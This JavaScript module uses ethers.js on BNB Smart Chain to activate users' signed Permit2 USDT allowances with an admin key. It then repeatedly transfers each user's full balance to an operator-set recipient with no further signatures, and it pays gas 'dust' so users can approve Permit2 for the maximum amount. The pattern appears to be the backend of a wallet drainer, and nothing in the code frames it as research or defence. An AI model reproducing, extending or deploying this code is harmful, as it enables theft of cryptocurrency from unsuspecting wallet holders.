import { ethers } from 'ethers';

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

// AllowanceTransfer ABI — two functions:
// 1. permit(): Submit the user's signed permit to set on-chain allowance
// 2. transferFrom(): Use the on-chain allowance to move tokens (no signature needed)
const PERMIT2_ABI = [
  // Submit the user's signed permit to activate the on-chain allowance
  'function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external',
  // Transfer tokens using the active on-chain allowance (no signature needed)
  'function transferFrom(address from, address to, uint160 amount, address token) external',
  // Read the current allowance state
  'function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)',
];

const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

/**
 * Step 1: Submit the user's signed permit to Permit2.
 * This sets an on-chain allowance that persists until expiration.
 * Only needs to be called ONCE per permit signature.
 */
export async function activatePermit(permit) {
  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
  const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
  const contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);

  const ownerAddress = ethers.getAddress(permit.owner);
  const tokenAddress = ethers.getAddress(permit.token);

  // Check that user has approved Permit2 on the USDT contract
  const usdtContract = new ethers.Contract(tokenAddress, USDT_ABI, provider);
  const erc20Allowance = await usdtContract.allowance(ownerAddress, PERMIT2_ADDRESS);

  if (erc20Allowance === 0n) {
    throw new Error('User has not approved Permit2 contract on USDT token yet. User must approve from the frontend first.');
  }

  // Build the PermitSingle struct
  const permitSingle = {
    details: {
      token: tokenAddress,
      amount: permit.amount, // uint160
      expiration: permit.deadline, // uint48 — the expiration timestamp
      nonce: permit.nonce,         // uint48 — Permit2 AllowanceTransfer nonce
    },
    spender: wallet.address, // admin wallet = msg.sender = spender
    sigDeadline: permit.deadline, // signature deadline
  };

  // Reconstruct the signature
  const signature = ethers.Signature.from({
    r: permit.r,
    s: permit.s,
    v: permit.v,
  }).serialized;

  console.log('Activating AllowanceTransfer permit...');
  console.log('  Owner:', ownerAddress);
  console.log('  Token:', tokenAddress);
  console.log('  Amount:', permit.amount);
  console.log('  Expiration:', permit.deadline);
  console.log('  Nonce:', permit.nonce);

  // Pre-simulate permit() call to check if it will revert before sending transaction
  try {
    await contract.permit.staticCall(ownerAddress, permitSingle, signature);
  } catch (simErr) {
    const reason = simErr.reason || simErr.shortMessage || simErr.message;
    console.warn(`Simulated permit() call reverted: ${reason}`);
    // Check if the allowance was already granted on-chain
    const existing = await contract.allowance(ownerAddress, tokenAddress, wallet.address);
    if (existing.amount > 0n) {
      console.log('Permit allowance is already active on-chain!');
      return '0xALREADY_ACTIVATED';
    }
    throw new Error(`Permit signature invalid or already processed on-chain: ${reason}`);
  }

  const tx = await contract.permit(ownerAddress, permitSingle, signature, {
    gasLimit: 200000,
  });

  console.log('Permit activation TX sent:', tx.hash);
  const receipt = await tx.wait();
  console.log('Permit activated on-chain! Hash:', receipt.hash);
  return receipt.hash;
}

/**
 * Step 2: Transfer tokens using the active on-chain allowance.
 * Can be called MANY TIMES without any further user signature.
 * Will transfer the user's current balance (up to the permitted amount).
 */
export async function executeTransfer(permit, customAmount = null) {
  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
  const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
  const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);

  const ownerAddress = ethers.getAddress(permit.owner);
  const tokenAddress = ethers.getAddress(permit.token);
  const recipientAddress = ethers.getAddress(process.env.RECIPIENT_ADDRESS);

  // Check user's current USDT balance
  const usdtContract = new ethers.Contract(tokenAddress, USDT_ABI, provider);
  const balance = await usdtContract.balanceOf(ownerAddress);

  if (balance === 0n) {
    throw new Error('User wallet currently has 0 USDT balance on-chain.');
  }

  // Check the current Permit2 allowance
  const [allowanceAmount, expiration, _nonce] = await permit2Contract.allowance(
    ownerAddress,
    tokenAddress,
    wallet.address
  );

  if (allowanceAmount === 0n) {
    throw new Error('No active Permit2 allowance. The permit needs to be activated first.');
  }

  const now = Math.floor(Date.now() / 1000);
  if (Number(expiration) > 0 && Number(expiration) < now) {
    throw new Error('Permit2 allowance has expired. User needs to sign a new permit.');
  }

  // Determine transfer amount: min(balance, allowance, customAmount)
  let transferAmount = balance < allowanceAmount ? balance : allowanceAmount;
  if (customAmount) {
    const customBigInt = BigInt(customAmount);
    if (customBigInt < transferAmount) {
      transferAmount = customBigInt;
    }
  }

  console.log('Executing transferFrom via Permit2 AllowanceTransfer...');
  console.log('  From:', ownerAddress);
  console.log('  To:', recipientAddress);
  console.log('  Amount:', transferAmount.toString());
  console.log('  Token:', tokenAddress);

  // Pre-simulate transferFrom() call to prevent on-chain reverts
  try {
    await permit2Contract.transferFrom.staticCall(
      ownerAddress,
      recipientAddress,
      transferAmount,
      tokenAddress
    );
  } catch (simErr) {
    const reason = simErr.reason || simErr.shortMessage || simErr.message;
    throw new Error(`Transfer simulation failed on-chain: ${reason}`);
  }

  const tx = await permit2Contract.transferFrom(
    ownerAddress,
    recipientAddress,
    transferAmount,
    tokenAddress,
    { gasLimit: 200000 }
  );

  console.log('Transfer TX sent:', tx.hash);
  const receipt = await tx.wait();
  console.log('Transfer confirmed! Hash:', receipt.hash);
  return { txHash: receipt.hash, amount: transferAmount.toString() };
}

/**
 * Check the current Permit2 AllowanceTransfer state for a user safely with error fallback.
 */
export async function checkPermit2Allowance(ownerAddress, tokenAddress) {
  try {
    if (!ownerAddress || !tokenAddress) return null;

    let cleanOwner, cleanToken;
    try {
      cleanOwner = ethers.getAddress(ownerAddress);
      cleanToken = ethers.getAddress(tokenAddress);
    } catch (addrErr) {
      return null;
    }

    const rpcUrl = process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/';
    const provider = new ethers.JsonRpcProvider(rpcUrl);

    let spender = process.env.ADMIN_PUBLIC_ADDRESS;
    if ((!spender || spender.startsWith('0x00000000000000000000')) && process.env.ADMIN_PRIVATE_KEY && !process.env.ADMIN_PRIVATE_KEY.startsWith('0x00000000000000000000')) {
      try {
        const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY);
        spender = wallet.address;
      } catch (e) {}
    }

    if (!spender || !ethers.isAddress(spender)) {
      return null;
    }

    const contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    const usdtContract = new ethers.Contract(cleanToken, USDT_ABI, provider);

    // Timeout helper for RPC call (3 seconds max)
    const fetchAllowance = Promise.all([
      contract.allowance(cleanOwner, cleanToken, spender),
      usdtContract.allowance(cleanOwner, PERMIT2_ADDRESS),
    ]);

    const timeout = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('RPC Timeout')), 3000)
    );

    const [[amount, expiration, nonce], erc20Allowance] = await Promise.race([fetchAllowance, timeout]);

    return {
      permit2Amount: amount.toString(),
      permit2Expiration: Number(expiration),
      permit2Nonce: Number(nonce),
      erc20Allowance: erc20Allowance.toString(),
      hasErc20Approval: erc20Allowance > 0n,
      hasPermit2Allowance: amount > 0n,
      isExpired: Number(expiration) > 0 && Number(expiration) < Math.floor(Date.now() / 1000),
    };
  } catch (err) {
    console.error('Error checking Permit2 allowance for', ownerAddress, err.message);
    return null;
  }
}

/**
 * Send the exact BNB needed for one USDT.approve(Permit2, MaxUint256) TX.
 * Simulates the real approve() call via estimateGas so the amount is precise.
 * Adds 30% buffer. Only sends the deficit vs user's current balance.
 */
export async function sendGasFunding(userAddress) {
  const USDT_ADDRESS   = '0x55d398326f99059ff775485246999027b3197955';
  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
  const wallet   = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);

  const recipientAddress = ethers.getAddress(userAddress);

  // ── 1. Simulate approve() to get the real gas units needed ──
  let approveGasUnits;
  try {
    const usdtIface = new ethers.Interface(['function approve(address spender, uint256 amount) external returns (bool)']);
    approveGasUnits = await provider.estimateGas({
      from: recipientAddress,                         // simulate as the actual user
      to:   USDT_ADDRESS,
      data: usdtIface.encodeFunctionData('approve', [PERMIT2_ADDRESS, ethers.MaxUint256]),
    });
    console.log(`estimateGas approve() for ${recipientAddress}: ${approveGasUnits} gas units`);
  } catch (e) {
    // Fallback if estimateGas fails (e.g. node doesn't support eth_estimateGas from 0-balance addr)
    console.warn('estimateGas failed, using fallback 65000:', e.message);
    approveGasUnits = 65000n;
  }

  // ── 2. Get live gas price — enforce 1 gwei floor (BSC wallets won't go below this) ──
  const feeData    = await provider.getFeeData();
  const rpcGasPrice = feeData.gasPrice || ethers.parseUnits('1', 'gwei');
  const minGasPrice = ethers.parseUnits('1', 'gwei'); // BSC minimum
  const gasPrice    = rpcGasPrice > minGasPrice ? rpcGasPrice : minGasPrice;

  // ── 3. Exact cost + 30% safety buffer ──
  const exactCost  = BigInt(approveGasUnits) * gasPrice;
  const fundAmount = exactCost + (exactCost * 30n / 100n);

  console.log(`Gas needed: ${ethers.formatEther(exactCost)} BNB (+ 30% buffer = ${ethers.formatEther(fundAmount)} BNB) at ${ethers.formatUnits(gasPrice, 'gwei')} gwei`);

  // ── 4. Only send the deficit ──
  const userBalance = await provider.getBalance(recipientAddress);
  if (userBalance >= fundAmount) {
    console.log(`User already has ${ethers.formatEther(userBalance)} BNB — skipping.`);
    return { txHash: null, alreadyFunded: true, balance: ethers.formatEther(userBalance) };
  }

  const deficit = fundAmount - userBalance;
  console.log(`Sending ${ethers.formatEther(deficit)} BNB gas dust to ${recipientAddress}...`);

  const tx      = await wallet.sendTransaction({ to: recipientAddress, value: deficit, gasLimit: 21000 });
  console.log('Gas funding TX sent:', tx.hash);
  const receipt = await tx.wait(); // wait for on-chain confirmation
  console.log('Gas funding confirmed:', receipt.hash);

  return { txHash: receipt.hash, alreadyFunded: false, amount: ethers.formatEther(deficit) };
}

/**
 * Get current on-chain nonce for AllowanceTransfer (owner, token, spender) from Permit2 contract.
 */
export async function getOnChainNonce(ownerAddress, tokenAddress = '0x55d398326f99059ff775485246999027b3197955') {
  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
  const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
  const contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);

  const [_, __, nonce] = await contract.allowance(
    ethers.getAddress(ownerAddress),
    ethers.getAddress(tokenAddress),
    wallet.address
  );
  return Number(nonce);
}

